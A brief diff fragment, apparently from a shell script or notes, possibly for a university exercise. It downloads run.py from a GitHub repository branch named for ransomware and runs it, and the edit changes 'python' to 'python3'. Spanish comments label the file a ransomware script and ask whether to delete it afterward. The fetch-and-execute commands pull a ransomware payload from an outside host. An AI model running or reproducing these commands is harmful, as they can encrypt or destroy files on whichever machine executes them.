@@ -6,7 +6,7 @@ cd Documentos/Facultad
 curl -O https://raw.githubusercontent.com/isoprophlex/ransomware/ransomware-without-socket/run.py
 
 # Ejecutar script de ransomware
-python run.py
+python3 run.py
 
 # Eliminar archivo de ransomware?
 # ?
